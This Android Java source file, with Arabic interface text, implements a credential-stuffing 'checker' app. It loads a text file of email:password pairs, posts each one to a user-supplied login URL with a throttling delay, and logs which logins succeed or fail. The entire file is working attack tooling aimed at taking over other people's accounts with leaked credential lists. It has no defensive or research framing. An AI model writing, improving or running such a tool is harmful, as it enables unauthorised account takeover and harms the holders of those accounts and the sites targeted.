package com.example.madqaq;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.progressindicator.LinearProgressIndicator;
import com.google.android.material.snackbar.Snackbar;
import okhttp3.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    // UI Components
    private TextInputEditText etLoginUrl, etDelay;
    private MaterialButton btnTestConnection, btnSelectFile, btnStart, btnPause, btnResume, btnStop;
    private Button btnResults, btnAbout, btnWebDashboard;
    private TextView tvFileName, tvFileSize, tvLineCount, tvStatus, tvProgress;
    private LinearProgressIndicator progressBar;
    private WebView webViewLog;
    private MaterialCardView cardFileInfo, cardSettings;
    private Switch switchAutoScroll;

    // Data
    private Uri selectedFileUri;
    private String selectedFileName = "";
    private int totalLines = 0;
    private boolean isRunning = false;
    private boolean isPaused = false;
    private Handler handler = new Handler();
    private SharedPreferences prefs;
    private OkHttpClient client;

    // Results
    private List<String> successResults = new ArrayList<>();
    private List<String> failedResults = new ArrayList<>();
    private int currentLine = 0;
    private long startTime = 0;
    private StringBuilder logBuilder = new StringBuilder();

    private static final int FILE_SELECT_CODE = 100;
    private static final int PERMISSION_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("MadqaqPrefs", MODE_PRIVATE);
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();

        initializeViews();
        setupClickListeners();
        loadSavedData();
        checkPermissions();
        setupWebView();
    }

    private void initializeViews() {
        etLoginUrl = findViewById(R.id.etLoginUrl);
        etDelay = findViewById(R.id.etDelay);
        btnTestConnection = findViewById(R.id.btnTestConnection);
        btnSelectFile = findViewById(R.id.btnSelectFile);
        btnStart = findViewById(R.id.btnStart);
        btnPause = findViewById(R.id.btnPause);
        btnResume = findViewById(R.id.btnResume);
        btnStop = findViewById(R.id.btnStop);
        btnResults = findViewById(R.id.btnResults);
        btnAbout = findViewById(R.id.btnAbout);
        btnWebDashboard = findViewById(R.id.btnWebDashboard);
        tvFileName = findViewById(R.id.tvFileName);
        tvFileSize = findViewById(R.id.tvFileSize);
        tvLineCount = findViewById(R.id.tvLineCount);
        tvStatus = findViewById(R.id.tvStatus);
        tvProgress = findViewById(R.id.tvProgress);
        progressBar = findViewById(R.id.progressBar);
        webViewLog = findViewById(R.id.webViewLog);
        cardFileInfo = findViewById(R.id.cardFileInfo);
        cardSettings = findViewById(R.id.cardSettings);
        switchAutoScroll = findViewById(R.id.switchAutoScroll);
    }

    private void setupClickListeners() {
        btnTestConnection.setOnClickListener(v -> testConnection());
        btnSelectFile.setOnClickListener(v -> selectFile());
        btnStart.setOnClickListener(v -> startChecking());
        btnPause.setOnClickListener(v -> pauseChecking());
        btnResume.setOnClickListener(v -> resumeChecking());
        btnStop.setOnClickListener(v -> stopChecking());
        btnResults.setOnClickListener(v -> startActivity(new Intent(this, ResultsActivity.class)));
        btnAbout.setOnClickListener(v -> startActivity(new Intent(this, AboutActivity.class)));
        btnWebDashboard.setOnClickListener(v -> startActivity(new Intent(this, WebDashboardActivity.class)));
    }

    private void loadSavedData() {
        String savedUrl = prefs.getString("login_url", "");
        String savedDelay = prefs.getString("delay", "2");
        etLoginUrl.setText(savedUrl);
        etDelay.setText(savedDelay);
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_CODE);
            }
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_CODE);
        }
    }

    private void setupWebView() {
        webViewLog.getSettings().setJavaScriptEnabled(true);
        webViewLog.getSettings().setLoadWithOverviewMode(true);
        webViewLog.getSettings().setUseWideViewPort(true);
        webViewLog.setWebViewClient(new WebViewClient());
        updateWebView();
    }

    private void updateWebView() {
        String html = "<html><head><style>" +
                "body { background: #1a1a2e; color: #00ff00; font-family: monospace; padding: 10px; }" +
                ".log-line { margin: 2px 0; padding: 4px; border-bottom: 1px solid #333; }" +
                ".success { color: #00ff00; } .failed { color: #ff4444; } .info { color: #4488ff; }" +
                "</style></head><body>" + logBuilder.toString() + "</body></html>";
        webViewLog.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    // التعديل الأساسي: نقل استدعاءات WebView إلى الخيط الرئيسي
    private void addLog(String message, String type) {
        String color = type.equals("success") ? "success" : type.equals("failed") ? "failed" : "info";
        logBuilder.append("<div class='log-line ").append(color).append("'>")
                .append(getCurrentTime()).append(" - ").append(message).append("</div>");

        // تنفيذ عمليات WebView على الخيط الرئيسي (UI Thread)
        runOnUiThread(() -> {
            updateWebView();
            if (switchAutoScroll.isChecked()) {
                webViewLog.loadUrl("javascript:window.scrollTo(0, document.body.scrollHeight);");
            }
        });
    }

    private String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    private void testConnection() {
        String url = etLoginUrl.getText().toString().trim();
        if (TextUtils.isEmpty(url)) {
            showSnackbar("الرجاء إدخال رابط تسجيل الدخول");
            return;
        }

        btnTestConnection.setEnabled(false);
        tvStatus.setText("جاري اختبار الاتصال...");

        Request request = new Request.Builder()
                .url(url)
                .method("POST", RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"),
                        "email=test@test.com&password=test123"))
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                runOnUiThread(() -> {
                    btnTestConnection.setEnabled(true);
                    tvStatus.setText("فشل الاتصال: " + e.getMessage());
                    showSnackbar("فشل الاتصال بالرابط");
                });
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                runOnUiThread(() -> {
                    btnTestConnection.setEnabled(true);
                    if (response.isSuccessful()) {
                        tvStatus.setText("✅ الاتصال ناجح - الرابط يعمل");
                        prefs.edit().putString("login_url", url).apply();
                        showSnackbar("تم حفظ الرابط بنجاح");
                    } else {
                        tvStatus.setText("⚠️ الرابط لا يستجيب بشكل صحيح");
                    }
                });
            }
        });
    }

    private void selectFile() {
        Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        intent.setType("text/plain");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        startActivityForResult(intent, FILE_SELECT_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_SELECT_CODE && resultCode == RESULT_OK && data != null) {
            selectedFileUri = data.getData();
            displayFileInfo();
        }
    }

    private void displayFileInfo() {
        try {
            InputStream inputStream = getContentResolver().openInputStream(selectedFileUri);
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

            String fileName = selectedFileUri.getLastPathSegment();
            tvFileName.setText("الملف: " + fileName);

            int fileSize = inputStream.available();
            tvFileSize.setText("الحجم: " + formatFileSize(fileSize));

            int lines = 0;
            while (reader.readLine() != null) lines++;
            reader.close();
            totalLines = lines;
            tvLineCount.setText("عدد الحسابات: " + lines);

            cardFileInfo.setVisibility(View.VISIBLE);
            showSnackbar("تم اختيار الملف بنجاح");
        } catch (Exception e) {
            showSnackbar("خطأ في قراءة الملف: " + e.getMessage());
        }
    }

    private String formatFileSize(int bytes) {
        if (bytes < 1024) return bytes + " B";
        else if (bytes < 1024 * 1024) return String.format("%.2f KB", bytes / 1024.0);
        else return String.format("%.2f MB", bytes / (1024.0 * 1024.0));
    }

    private void startChecking() {
        String url = etLoginUrl.getText().toString().trim();
        String delay = etDelay.getText().toString().trim();

        if (TextUtils.isEmpty(url)) {
            showSnackbar("الرجاء إدخال رابط تسجيل الدخول");
            return;
        }

        if (selectedFileUri == null) {
            showSnackbar("الرجاء اختيار ملف TXT");
            return;
        }

        if (TextUtils.isEmpty(delay)) {
            etDelay.setText("2");
            delay = "2";
        }

        int delaySeconds = Integer.parseInt(delay);
        if (delaySeconds < 1) {
            showSnackbar("يجب أن يكون التأخير ثانية واحدة على الأقل");
            return;
        }

        isRunning = true;
        isPaused = false;
        currentLine = 0;
        startTime = System.currentTimeMillis();

        prefs.edit().putString("delay", delay).apply();

        btnStart.setEnabled(false);
        btnPause.setEnabled(true);
        btnStop.setEnabled(true);
        btnSelectFile.setEnabled(false);
        tvStatus.setText("جاري الفحص...");
        progressBar.setMax(totalLines);
        progressBar.setProgress(0);

        successResults.clear();
        failedResults.clear();
        logBuilder.setLength(0);
        updateWebView();

        startCheckThread(delaySeconds);
    }

    private void startCheckThread(int delaySeconds) {
        new Thread(() -> {
            try {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(getContentResolver().openInputStream(selectedFileUri)));

                String line;
                while ((line = reader.readLine()) != null && isRunning) {
                    if (isPaused) {
                        Thread.sleep(100);
                        continue;
                    }

                    currentLine++;
                    final int progress = currentLine;

                    runOnUiThread(() -> {
                        progressBar.setProgress(progress);
                        tvProgress.setText(progress + " / " + totalLines);
                        updateWebView();
                    });

                    processLine(line, delaySeconds);

                    Thread.sleep(delaySeconds * 1000L);
                }

                reader.close();

                runOnUiThread(() -> {
                    if (isRunning) {
                        tvStatus.setText("✅ اكتمل الفحص");
                        showSnackbar("تم الانتهاء من فحص جميع الحسابات");
                        resetUI();
                    }
                });

            } catch (Exception e) {
                runOnUiThread(() -> {
                    tvStatus.setText("❌ خطأ: " + e.getMessage());
                    resetUI();
                });
            }
        }).start();
    }

    private void processLine(String line, int delay) {
        String[] parts = line.split(":");
        if (parts.length >= 2) {
            String email = parts[0].trim();
            String password = parts[1].trim();

            try {
                String url = etLoginUrl.getText().toString().trim();
                RequestBody formBody = new FormBody.Builder()
                        .add("email", email)
                        .add("password", password)
                        .build();

                Request request = new Request.Builder()
                        .url(url)
                        .post(formBody)
                        .build();

                Response response = client.newCall(request).execute();

                if (response.isSuccessful()) {
                    successResults.add(line);
                    addLog("✅ نجاح - " + email, "success");
                } else {
                    failedResults.add(line);
                    addLog("❌ فشل - " + email + " (" + response.code() + ")", "failed");
                }

                response.close();

            } catch (Exception e) {
                failedResults.add(line);
                addLog("⚠️ خطأ - " + email + ": " + e.getMessage(), "failed");
            }
        } else {
            addLog("⚠️ تنسيق غير صحيح: " + line, "failed");
        }
    }

    private void pauseChecking() {
        isPaused = true;
        btnPause.setEnabled(false);
        btnResume.setEnabled(true);
        tvStatus.setText("⏸ متوقف مؤقتاً");
        addLog("تم إيقاف الفحص مؤقتاً", "info");
    }

    private void resumeChecking() {
        isPaused = false;
        btnPause.setEnabled(true);
        btnResume.setEnabled(false);
        tvStatus.setText("جاري الفحص...");
        addLog("تم استئناف الفحص", "info");
    }

    private void stopChecking() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("إيقاف الفحص")
                .setMessage("هل أنت متأكد من إيقاف الفحص؟")
                .setPositiveButton("نعم", (dialog, which) -> {
                    isRunning = false;
                    isPaused = false;
                    tvStatus.setText("⛔ تم الإيقاف");
                    addLog("تم إيقاف الفحص", "info");
                    resetUI();
                })
                .setNegativeButton("لا", null)
                .show();
    }

    private void resetUI() {
        btnStart.setEnabled(true);
        btnPause.setEnabled(false);
        btnResume.setEnabled(false);
        btnStop.setEnabled(false);
        btnSelectFile.setEnabled(true);
    }

    private void showSnackbar(String message) {
        Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putString("log", logBuilder.toString());
        outState.putInt("currentLine", currentLine);
        outState.putBoolean("isRunning", isRunning);
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        if (savedInstanceState != null) {
            logBuilder = new StringBuilder(savedInstanceState.getString("log", ""));
            currentLine = savedInstanceState.getInt("currentLine", 0);
            isRunning = savedInstanceState.getBoolean("isRunning", false);
            updateWebView();
        }
    }
}